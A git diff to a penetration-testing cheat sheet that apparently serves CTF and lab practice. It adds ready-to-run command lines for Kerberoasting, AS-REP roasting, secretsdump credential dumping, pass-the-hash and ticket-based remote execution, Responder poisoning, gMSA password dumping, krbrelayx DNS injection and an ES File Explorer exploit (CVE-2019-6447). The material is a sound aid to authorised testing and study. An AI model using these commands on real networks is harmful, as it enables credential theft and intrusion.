@@ -229,6 +229,7 @@ $ ldapsearch -LLL -x -H ldap://10.10.10.10 -b '' -s base '(objectclass=*)'
 $ ldapsearch -x -h 10.10.10.10 -D 'BANK\nik' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'
 $ ldapsearch -x -h 10.10.10.10 -D 'nik@bank.local' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'
 $ ldapsearch -x -h 10.10.10.10 -D 'nik@bank.local' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local' | grep -i <user> -C 40
+$ ldapsearch -x -h 10.10.10.10 -D 'nik@bank.local' -w 'Password@123!' -b 'DC=bank,DC=local' "(userAccountControl:1.2.840.113556.1.4.803:=524288)" samaccountname
 
 => Ldap Queries
 => find domain computers not dc
@@ -1323,39 +1324,48 @@ https://github.com/ankh2054/windows-pentest
 ### Linux Commands
 
 ```code
-# Remove First Character
-echo "xtest" | cut -c2-
+=> Remove First Character
+$ echo "xtest" | cut -c2-
 
-# Remove the first occurence character
-echo $i | sed 's@/@@' # Remove '/' 
+=> Remove the first occurence character
+$ echo $i | sed 's@/@@' # Remove '/' 
 
-# Remove the first / if got
-for i in $(cat wordlist.txt);do if [[ $i == /* ]]; then echo $i | sed 's@/@@'; else echo $i; fi;done
+=> Remove the first / if got
+$ for i in $(cat wordlist.txt);do if [[ $i == /* ]]; then echo $i | sed 's@/@@'; else echo $i; fi;done
 
-# Loop and read from file (line by line)
-while IFS= read -r line; do echo "$line" ; done < word.txt
+=> Loop and read from file (line by line)
+$ while IFS= read -r line; do echo "$line" ; done < word.txt
 
-# xxd
-xxd notes.txt
-echo "62006600610038003100300034007d000d000a00" | xxd -r -p
+=> xxd
+$ xxd notes.txt
+$ echo "62006600610038003100300034007d000d000a00" | xxd -r -p
 
-# Add new user
-sudo useradd username
-sudo useradd -d /opt/home username
-sudo useradd -u 1002 username
-sudo useradd -u 1002 -g 500 username
-sudo useradd -u 1002 -G admins,webadmins,dev username
-sudo useradd -M username
-sudo useradd -e 2021-10-10 username
-sudo useradd -e 2021-10-10 -f 50 username
-sudo useradd -c "New User 2021" username
-sudo useradd -s /sbin/nologin username
+=> Add new user
+$ sudo useradd username
+$ sudo useradd -d /opt/home username
+$ sudo useradd -u 1002 username
+$ sudo useradd -u 1002 -g 500 username
+$ sudo useradd -u 1002 -G admins,webadmins,dev username
+$ sudo useradd -M username
+$ sudo useradd -e 2021-10-10 username
+$ sudo useradd -e 2021-10-10 -f 50 username
+$ sudo useradd -c "New User 2021" username
+$ sudo useradd -s /sbin/nologin username
 
-# Add to sudo group
-sudo usermod -aG sudo username
+=> Add to sudo group
+$ sudo usermod -aG sudo username
 
-# Remove From sudo group
-sudo deluser username sudo
+=> Mount
+$ mkdir mount; sudo mount //10.10.10.10/Drive mount/ -o username=”nik”,password=”Passw0rd@123!”
+
+=> ntpdate
+$ ntpdate 10.10.10.10.10
+
+=> net
+$ net time set -S 10.10.10.10
+
+=> Remove From sudo group
+$ sudo deluser username sudo
 ```
 
 ### Cisco Type 7 Password Decrypter
@@ -1594,6 +1604,8 @@ $ neo4j:neo4j
 https://www.vincentyiu.com/red-team-tips
 https://vysecurity.rocks/
 https://herrscher.info/index.php/2021/04/11/red-teaming-guide/
+http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
+https://www.exploit-db.com/docs/48282
 ```
 
 ### Rubeus
@@ -1692,6 +1704,18 @@ https://poshc2.readthedocs.io/en/latest/
 https://github.com/zenosxx/PoshC2
 ```
 
+### Adb
+
+```bash
+=> Install
+$ sudo apt-get install android-tools-adb android-tools-fastboot
+
+=> Commands
+$ adb devices
+$ adb shell
+$ adb -s localhost:5555 shell
+```
+
 ### Pypykatz
 
 ```code
@@ -1750,44 +1774,56 @@ $ crackmapexec smb 10.10.10.10 -u 'nik' -H hash_uniq.txt
 ### Impacket Tools
 
 ```bash
-# GetNPUsers.py (AsrepRoasting)
-GetNPUsers.py -dc-ip 10.10.10.10 -request 'bank.local/' -no-pass -usersfile user.txt -format hashcat
-=> mode 18200
+=> GetNPUsers.py (AsrepRoasting)
+$ GetNPUsers.py -dc-ip 10.10.10.10 -request 'bank.local/' -no-pass -usersfile user.txt -format hashcat
+ mode 18200
 
-# GetUserSPNs.py (Kerberoasting)
-GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outputfile output.txt
+=> GetUserSPNs.py (Kerberoasting)
+$ GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outputfile output.txt
 
-# GetADUsers.py
-GetADUsers.py -all bank.local/nik:'Password@123!'-dc-ip 10.10.10.10
+=> GetADUsers.py
+$ GetADUsers.py -all bank.local/nik:'Password@123!'-dc-ip 10.10.10.10
 
-# secretsdump.py
-export KRB5CCNAME=Administrator.ccache
-secretsdump.py -k DC01.bank.local -just-dc
-secretsdump.py -just-dc bank.local/nik:'Password@123!'@10.10.10.10
-secretsdump.py -ntds ntds.dit -system system local
-secretsdump.py -ntds ntds.dit -system system local -history
-secretsdump.py -sam SAM -system SYSTEM local
-secretsdump.py -ntds ntds.dit -system system.hive local -outputfile dump.txt
+=> secretsdump.py
+$ export KRB5CCNAME=Administrator.ccache
+$ secretsdump.py -k DC01.bank.local -just-dc
+$ secretsdump.py -just-dc bank.local/nik:'Password@123!'@10.10.10.10
+$ secretsdump.py -ntds ntds.dit -system system local
+$ secretsdump.py -ntds ntds.dit -system system local -history
+$ secretsdump.py -sam SAM -system SYSTEM local
+$ secretsdump.py -ntds ntds.dit -system system.hive local -outputfile dump.txt
 
-# getST.py
-getST.py -spn MSSQL/DC01.BANK.LOCAL 'BANK.LOCAL/nik:password' -impersonate Administrator -dc-ip 10.10.10.10
+=> getST.py
+$ getST.py -spn MSSQL/DC01.BANK.LOCAL 'BANK.LOCAL/nik:password' -impersonate Administrator -dc-ip 10.10.10.10
+$ getST.py -spn MSSQL/DC01.BANK.LOCAL 'BANK.LOCAL/nik' -impersonate Administrator -dc-ip 10.10.10.10 -hashes ':2182eed0101516d0ax06b98c579x65e6'
 
-# wmiexec.py
-wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
-wmiexec.py -hashes :0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
+=> wmiexec.py
+$ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
+$ wmiexec.py -hashes :0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
 
-# psexec.py
-psexec.py BANK\Administrator@10.10.10.10 -hashes 'aad3b435b51404eeaad3b435b51404ee:2182eed0101516d0ax06b98c579x65e6'
-psexec.py bank.local/nik:'Password@123'@10.10.10.10
+=> psexec.py
+$ psexec.py BANK\Administrator@10.10.10.10 -hashes 'aad3b435b51404eeaad3b435b51404ee:2182eed0101516d0ax06b98c579x65e6'
+$ psexec.py bank.local/nik:'Password@123'@10.10.10.10
+$ export KRB5CCNAME=Administrator.ccache;psexec.py -dc-ip 10.10.10.10 -target-ip 10.10.10.10 -no-pass -k bank.local/Administrator@DC.bank.local
+$ export KRB5CCNAME=Administrator.ccache;psexec.py bank.local/Administrator@DC.bank.local -k -no-pass
 
-# smbclient.py
-smbclient.py bank.local/nik:'Password@123'@10.10.10.10
+=> smbclient.py
+$ smbclient.py bank.local/nik:'Password@123'@10.10.10.10
+$ export KRB5CCNAME=Administrator.ccache;smbclient.py bank.local/administrator@dc.bank.local -dc-ip 10.10.10.10 -target-ip 10.10.10.10 -no-pass -k
+$ export KRB5CCNAME=Administrator.ccache;smbclient.py bank.local/administrator@dc.bank.local -no-pass -k
+$ shares
+$ ls
+$ cd ..
+$ cat flag.txt
 
-# mssqlclient.py
-mssqlclient.py  -windows-auth bank.local/aniq:'Password@123'@10.10.10.10
+=> mssqlclient.py
+$ mssqlclient.py  -windows-auth bank.local/aniq:'Password@123'@10.10.10.10
 
-# ticketConverter.py
-ticketConverter.py cifs.kirbi cifs.ccache
+=> ticketConverter.py
+$ ticketConverter.py cifs.kirbi cifs.ccache
+
+=> References
+$ https://www.hackingarticles.in/abusing-kerberos-using-impacket/
 ```
 
 ### Git-LFS
@@ -1892,12 +1928,57 @@ Link : https://github.com/BushidoUK/CTI-Lexicon/blob/main/Lexicon.md
 - http://waifu2x.udp.jp/
 ```
 
-### printerbug.py
+### Responder
 
 ```bash
-# Commands
+=> Download
+$ https://github.com/SpiderLabs/Responder
 
-# References
+=> Configuration Location
+$ /etc/responder/Responder.conf
+
+=> Commands
+$ sudo responder -I tun0 -rdwv
+```
+
+### gMSADumper.py
+
+```bash
+=> Download
+$ https://github.com/micahvandeusen/gMSADumper
+
+=> Commands
+$ python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb
+
+=> References
+$ https://docs.microsoft.com/en-us/windows/win32/adschema/a-msds-managedpasswordid
+$ https://github.com/n00py/LAPSDumper/
+$ https://github.com/micahvandeusen/gMSADumper
+```
+
+### Krbrelayx - Unconstrained delegation abuse toolkit
+
+```bash
+=> Download
+$ https://github.com/dirkjanm/krbrelayx
+
+=> printerbug.py
+$ Simple tool to trigger SpoolService bug via RPC backconnect
+$ 
+
+=> addspn.py
+$ Add an SPN to a user/computer account
+$ 
+
+=> dnstool.py
+$ Query/modify DNS records for Active Directory integrated DNS via LDAP
+$ .\dnstool.py -u BANK\\nik -p 'Passw0rd@123!' -r web01.bank.local -d 10.10.10.12 --action add 19.10.10.10
+
+=> krbrelayx.py
+$ Kerberos "relay" tool. Abuses accounts with unconstrained delegation to pwn
+things.
+
+=> References
 https://github.com/dirkjanm/krbrelayx
 ```
 
@@ -3857,6 +3938,24 @@ select
 sqlite3 database.db
 select id,name,is_admin from user;
 update user set is_admin=1 where id=3;
+```
+
+### ES File Explorer Open Port Vulnerability (CVE-2019-6447)
+
+```bash
+=> Download
+$ https://www.exploit-db.com/exploits/50070
+
+=> Commands
+$ python3 exploit.py listApps 10.10.10.10
+$ python3 exploit.py listFiles 10.10.10.10
+$ python3 exploit.py listAppsSdcard 10.10.10.10
+$ python3 exploit.py getDeviceInfo 10.10.10.10
+$ python3 exploit.py listAppsPhone 10.10.10.10
+$ python3 exploit.py listPics 10.10.10.10
+
+=> References
+$ https://medium.com/@knownsec404team/analysis-of-es-file-explorer-security-vulnerability-cve-2019-6447-7f34407ed566
 ```
 
 # F. Bug Bounty
